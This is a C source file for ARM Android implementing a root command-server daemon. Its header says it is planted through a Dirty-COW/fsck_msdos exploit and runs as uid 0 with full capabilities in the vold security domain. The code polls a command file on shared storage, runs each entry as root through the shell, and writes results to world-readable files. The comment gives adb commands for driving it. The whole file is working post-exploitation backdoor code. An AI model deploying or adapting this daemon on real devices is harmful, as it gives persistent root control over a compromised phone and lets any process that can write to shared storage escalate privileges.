/* session62 root_daemon.c  (resident root command server, vold-domain root)
 *
 * Delivered once by the Dirty-COW/fsck_msdos trick (SD reinsert) as uid 0 in
 * u:r:vold:s0 with full caps. It daemonizes and then polls a command file on
 * the internal emulated storage, executing each command as uid 0 via
 * /system/bin/sh -c (which we verified stays in u:r:vold:s0 with full caps).
 *
 *   command in : /storage/emulated/legacy/rd_cmd   (text; consumed + cleared)
 *   output     : /storage/emulated/legacy/rd_out   (stdout+stderr, truncated)
 *   status     : /storage/emulated/legacy/rd_stat  ("ok <rc>" or "busy")
 *   liveness   : /storage/emulated/legacy/rd_alive (heartbeat counter)
 *
 * Drive it from adb:
 *   adb push cmd.txt /storage/emulated/legacy/rd_cmd
 *   adb shell cat /storage/emulated/legacy/rd_out
 * Special command "RQUIT" stops the daemon.
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close      6
#define SYS_execve      11
#define SYS_dup2        63
#define SYS_nanosleep   162
#define SYS_umask       60
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_CREAT         0x40
#define O_TRUNC         0x200

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }
static int seq(const char *a, const char *b) { while (*a && *b) { if (*a != *b) return 0; a++; b++; } return *a == *b; }

static const char *OUTBASE = "/storage/emulated/legacy/";
static char p_cmd[128], p_out[128], p_stat[128], p_alive[128];

static void write_str(const char *path, const char *s)
{
    long f = sc6(SYS_open, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)s, slen(s), 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void write_hexline(const char *path, const char *tag, unsigned long v)
{
    char b[64]; int i = 0;
    while (*tag) b[i++] = *tag++;
    b[i++] = '0'; b[i++] = 'x';
    for (int k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n';
    write_str(path, b);
    (void)i;
}

static char *sh_argv0 = "/system/bin/sh";
static char *sh_argc  = "-c";
static char env0[] = "PATH=/sbin:/system/sbin:/system/bin:/system/xbin";
static char env1[] = "HOME=/";
static char *sh_envp[] = { env0, env1, 0 };

struct timespec { long sec; long nsec; };

void _start(void)
{
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(p_cmd, OUTBASE);   scat(p_cmd, "rd_cmd");
    scpy(p_out, OUTBASE);   scat(p_out, "rd_out");
    scpy(p_stat, OUTBASE);  scat(p_stat, "rd_stat");
    scpy(p_alive, OUTBASE); scat(p_alive, "rd_alive");

    /* daemonize: parent (the fsck invocation) returns 0 immediately */
    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    write_str(p_alive, "started\n");
    write_str(p_stat, "idle\n");

    unsigned long beat = 0;
    for (;;) {
        /* heartbeat */
        write_hexline(p_alive, "beat=", beat++);

        long fd = sc6(SYS_open, (long)p_cmd, O_RDONLY, 0, 0, 0, 0);
        if (fd >= 0) {
            static char buf[8192];
            long n = sc6(SYS_read, fd, (long)buf, sizeof buf - 1, 0, 0, 0);
            sc6(SYS_close, fd, 0, 0, 0, 0, 0);
            if (n > 0) {
                buf[n] = 0;
                /* strip trailing newlines */
                while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = 0;

                if (seq(buf, "RQUIT")) { write_str(p_stat, "quit\n"); ex(0); }

                /* clear the command file first so we don't reprocess */
                write_str(p_cmd, "");

                write_str(p_stat, "busy\n");
                long child = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
                if (child == 0) {
                    long of = sc6(SYS_open, (long)p_out, O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0, 0);
                    if (of >= 0) { sc6(SYS_dup2, of, 1, 0, 0, 0, 0); sc6(SYS_dup2, of, 2, 0, 0, 0, 0); sc6(SYS_close, of, 0, 0, 0, 0, 0); }
                    char *argv[4];
                    argv[0] = sh_argv0; argv[1] = sh_argc; argv[2] = buf; argv[3] = 0;
                    sc6(SYS_execve, (long)sh_argv0, (long)argv, (long)sh_envp, 0, 0, 0);
                    sc6(SYS_write, 2, (long)"execve failed\n", 15, 0, 0, 0);
                    ex(127);
                }
                long st = 0;
                /* wait4(child, &st, 0, 0) is syscall 114 */
                {
                    register long r0 asm("r0") = child;
                    register long r1 asm("r1") = (long)&st;
                    register long r2 asm("r2") = 0;
                    register long r3 asm("r3") = 0;
                    register long r7 asm("r7") = 114;
                    asm volatile("svc 0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r3), "r"(r7) : "memory");
                }
                write_hexline(p_stat, "ok rc=", ((unsigned long)st >> 8) & 0xff);
            }
        }

        struct timespec ts; ts.sec = 1; ts.nsec = 0;
        sc6(SYS_nanosleep, (long)&ts, 0, 0, 0, 0, 0);
    }
}
